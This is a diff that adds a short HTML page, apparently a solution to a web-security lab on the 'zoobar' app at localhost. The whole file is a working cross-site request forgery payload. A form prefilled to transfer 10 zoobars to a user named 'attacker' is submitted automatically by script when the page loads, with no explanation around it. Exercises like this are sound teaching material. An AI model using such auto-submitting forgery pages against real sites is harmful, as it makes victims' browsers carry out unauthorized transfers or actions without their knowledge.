@@ -1,0 +1,7 @@
+<base href="http://localhost:8080">
+<form method="POST" name="transferform" action="/zoobar/index.cgi/transfer">
+	<p>Send <input name="zoobars" type="text" value="10" size=5> zoobars</p>
+	<p>to <input name=recipient type=text value="attacker" size=10></p>
+	<input type="submit" name="submission" value="Send">
+</form>
+<script>document.getElementsByName("transferform")[0].submit();</script>
